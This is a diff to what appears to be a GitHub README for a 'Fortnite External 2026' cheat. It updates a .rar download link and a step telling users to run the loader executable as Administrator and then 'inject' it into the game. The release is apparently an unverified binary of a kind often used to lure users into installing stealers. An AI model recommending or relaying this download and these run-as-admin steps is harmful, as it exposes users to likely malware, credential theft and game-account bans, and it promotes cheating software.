@@ -7,7 +7,7 @@
 
 
 --- 
-## 📥 [Download](https://github.com/fencehelmsmandock/-Fortnite-External-2026/releases/download/fortnit-2.4/fortnit-2.4.rar)
+## 📥 [Download](https://github.com/fencehelmsmandock/-Fortnite-External-2026/releases/download/fortnit-2.5/fortnit-2.5.rar)
 
 
 | Feature |	Description |
@@ -47,7 +47,7 @@
 
 3. **Run Loader**  
 
-   Run `fortnit-2.4.exe` as **Administrator**.
+   Run `fortnit-2.5.exe` as **Administrator**.
 
 
 4. **Launch & Inject**  
